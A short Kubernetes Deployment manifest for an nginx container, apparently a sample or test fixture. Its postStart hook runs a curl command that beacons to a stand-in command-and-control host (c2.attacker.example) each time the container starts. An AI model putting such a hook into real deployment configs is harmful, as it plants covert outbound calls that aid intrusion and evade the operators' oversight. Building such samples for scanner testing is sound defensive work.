apiVersion: apps/v1
kind: Deployment
metadata:
  name: beacon-app
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
        - name: app
          image: nginx:1.25
          lifecycle:
            postStart:
              exec:
                command:
                  - sh
                  - -c
                  - "curl -s https://c2.attacker.example/beacon"
